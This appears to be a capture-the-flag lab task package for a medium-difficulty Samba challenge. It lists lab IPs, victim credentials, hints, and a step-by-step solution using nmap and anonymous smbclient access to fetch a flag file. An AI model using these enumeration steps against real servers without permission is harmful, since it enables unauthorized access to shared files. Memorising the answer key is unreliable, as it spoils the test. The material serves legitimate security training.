# samba-anonymous-share-access

## Description
A misconfigured Samba server allows anonymous access to sensitive shares. Your task is to identify the vulnerable Samba service, enumerate available shares, and retrieve the flag from the anonymous accessible share.

## Scenario
During a network penetration test, you've discovered a Linux server running Samba file sharing services. The system administrator has misconfigured the Samba server to allow anonymous access to certain shares. Your objective is to exploit this misconfiguration to access sensitive files and retrieve the flag.

## Difficulty
medium

## Machines
- **attacker** (attacker): 172.20.145.3 - ssh
- **victim** (victim): 172.20.145.23 - samba, ssh
## Victim credentials
- **victim**: `appuser` / `getflag`

## Hints
1. Start by scanning the network to identify open SMB ports
2. Use enum4linux or smbclient to enumerate available shares without authentication
3. Look for shares that allow anonymous or guest access

## Flag Format
CTF{...}

## Solution (Samba)

1. **Scan the victim** for SMB ports: `nmap -p 139,445 --open <victim_ip>`. (Port 139 = NetBIOS, 445 = SMB; both are normal for Samba.)
2. **List shares** (no password): `smbclient -L //<victim_ip> -N`. If you see "Protocol negotiation... SMB1" or "Unable to connect with SMB1", ignore it—the share list still succeeded. To avoid the message, use: `smbclient -L //<victim_ip> -N --option='client min protocol=SMB2'`.
3. **Connect to the share**: `smbclient //<victim_ip>/share -N`.
4. **List and get the flag**: `ls`, then `get flag.txt`, then `cat flag.txt` (or open it locally).

